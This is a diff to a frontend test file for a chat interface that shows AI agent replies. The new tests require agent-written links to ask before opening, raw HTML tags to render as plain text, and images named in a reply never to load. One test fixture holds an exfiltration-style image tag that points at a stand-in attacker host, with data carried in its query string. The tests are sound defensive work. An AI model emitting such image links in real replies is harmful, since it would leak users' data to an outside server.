@@ -99,8 +99,11 @@ describe("the chat's thread", () => {
     const strong = await within(log).findByText("draft");
     expect(strong.tagName).toBe("STRONG");
     expect(within(log).getByText("a.ts").tagName).toBe("CODE");
-    const link = within(log).getByRole("link", { name: "the docs" });
-    expect(link.getAttribute("rel")).toBe("noopener noreferrer");
+    // A link asks before it opens (see below), so it is a button.
+    const link = within(log).getByRole("button", { name: "the docs" });
+    // In the reply's own colour and weight, Streamdown's merged away.
+    expect(link.className).toContain("text-current");
+    expect(link.className).not.toContain("text-primary");
     const anchor = within(log).getByText("What changed?").closest("[data-scroll-anchor]");
     expect(anchor?.getAttribute("data-scroll-anchor")).toBe("true");
     expect(strong.closest("[data-scroll-anchor]")?.getAttribute("data-scroll-anchor")).not.toBe("true");
@@ -124,10 +127,23 @@ describe("the chat's thread", () => {
     expect(screen.getByText("Here:").closest('[data-slot="code-block"]')).toBeNull();
   });
 
-  it("keeps the text of raw HTML's code", async () => {
-    await play(createChat<ChatMessage>().user("Show me").assistant("<pre><code>before <b>bold</b> after</code></pre>"));
-    await screen.findByText("bold");
-    expect(document.querySelector('[data-slot="code-block"]')).toBeNull();
+  it("shows a tag the reply names as the text it is", async () => {
+    await play(
+      createChat<ChatMessage>().user("Show me").assistant("Wrap it in <Thread /> and type it as Array<string>."),
+    );
+    expect(await screen.findByText("Wrap it in <Thread /> and type it as Array<string>.")).toBeTruthy();
+  });
+
+  it("asks before a link the agent wrote opens", async () => {
+    const open = vi.spyOn(window, "open").mockImplementation(() => null);
+    await play(createChat<ChatMessage>().user("Where?").assistant("See [the docs](https://example.com/docs)."));
+    fireEvent.click(await screen.findByRole("button", { name: "the docs" }));
+    const dialog = await screen.findByRole("dialog", { name: "Open this link?" });
+    expect(within(dialog).getByText("https://example.com/docs")).toBeTruthy();
+    expect(open).not.toHaveBeenCalled();
+    fireEvent.click(within(dialog).getByRole("button", { name: "Open" }));
+    expect(open).toHaveBeenCalledExactlyOnceWith("https://example.com/docs", "_blank", "noreferrer");
+    open.mockRestore();
   });
 
   it("loads no image a reply names, by Markdown or by HTML", async () => {
@@ -138,7 +154,9 @@ describe("the chat's thread", () => {
     );
     // The turn over, and past the plain text shown until the renderer's chunk comes.
     await screen.findByRole("button", { name: "Copy" });
-    await waitFor(() => expect(document.documentElement.innerHTML).not.toContain("evil.example"));
+    // The Markdown image is dropped; the HTML one is the text it is, never an element.
+    await waitFor(() => expect(screen.getByRole("log").textContent).not.toContain("d=secret"));
+    expect(screen.getByRole("log").textContent).toContain('<img src="https://evil.example/?d=raw" />');
     expect(document.querySelector("img")).toBeNull();
     expect(screen.getByRole("log").textContent).toContain("Done.");
   });
